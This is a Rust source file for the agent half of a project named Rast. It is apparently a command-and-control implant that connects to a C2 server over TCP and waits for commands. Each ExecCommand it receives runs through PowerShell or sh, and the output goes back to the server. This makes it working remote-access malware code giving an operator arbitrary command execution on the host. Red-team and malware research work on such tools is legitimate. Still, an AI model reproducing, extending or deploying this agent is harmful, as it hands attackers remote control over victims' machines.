//! The agent part of the Rast project.

use std::{
    ops::DerefMut,
    sync::{Arc, RwLock},
};

use anyhow::{anyhow, Result};
use bytes::Bytes;
use commands::Commands;
use futures_util::{sink::SinkExt, stream::StreamExt};
use rast::{
    messages::c2_agent::{AgentMessage, AgentResponse, C2Request},
    protocols::{tcp::TcpFactory, *},
    settings::Settings,
};
use tokio::{process::Command as SystemCommand, sync::Mutex};
use tokio_util::codec::BytesCodec;
use tracing::{debug, info};

use crate::context::Context;

pub mod commands;
pub mod context;

pub struct RastAgent {
    settings: Settings,
    context: Arc<RwLock<Context>>,
    connection: Arc<Mutex<dyn ProtoConnection>>,
    commands: Commands,
}

impl RastAgent {
    /// Creates new instance using provided [Settings].
    pub async fn with_settings(settings: Settings) -> Result<Self> {
        let connection = if let Some(conf) = &settings.server.tcp {
            TcpFactory::new_client(conf).await
        } else {
            Err(anyhow!("Can't connect to C2 using TCP."))
        };

        Ok(RastAgent {
            settings,
            connection: connection.unwrap(),
            commands: Commands::new(),
            context: Arc::new(RwLock::new(Context::new())),
        })
    }

    /// Starts execution.
    pub async fn run(&mut self) -> Result<()> {
        info!("RastAgent running");

        let mut conn = self.connection.lock().await;
        let mut frame = get_rw_frame(conn.deref_mut(), BytesCodec::new());

        loop {
            if let Some(bytes) = frame.next().await {
                let bytes = match bytes {
                    Ok(bytes) => bytes,
                    Err(e) => {
                        debug!("Failed to parse bytes: {:?}", e);
                        continue;
                    },
                };
                let msg: AgentMessage = match serde_json::from_slice(&bytes) {
                    Ok(msg) => {
                        info!("Request {:?}", msg);
                        msg
                    },
                    Err(e) => {
                        debug!("Failed to deserialized to message: {:?}", e);
                        continue;
                    },
                };
                let AgentMessage::C2Request(C2Request::ExecCommand(cmd)) = msg else {
                    debug!("Got unsupported request: {:?}", msg);
                    continue;
                };

                let output = if cfg!(target_os = "windows") {
                    SystemCommand::new("powershell.exe")
                        .arg("-c")
                        .arg(cmd)
                        .output()
                        .await
                } else {
                    SystemCommand::new("sh").arg("-c").arg(cmd).output().await
                };

                info!("Response {:?}", output);
                let response = match output {
                    Ok(output) => String::from_utf8_lossy(&output.stdout).into(),
                    Err(e) => e.to_string(),
                };
                let response =
                    AgentMessage::AgentResponse(AgentResponse::CommandResponse(response));
                let response = match serde_json::to_vec(&response) {
                    Ok(serialized) => serialized,
                    Err(e) => {
                        info!(
                            "Failed to serialize response, not sending response: {:?}",
                            e
                        );
                        continue;
                    },
                };

                if let Err(e) = frame.send(Bytes::from(response)).await {
                    debug!("Failed to send response: {:?}", e);
                };
            }
        }
    }
}

#[cfg(test)]
mod tests {
    #[test]
    fn it_works() {
        let result = 2 + 2;
        assert_eq!(result, 4);
    }
}
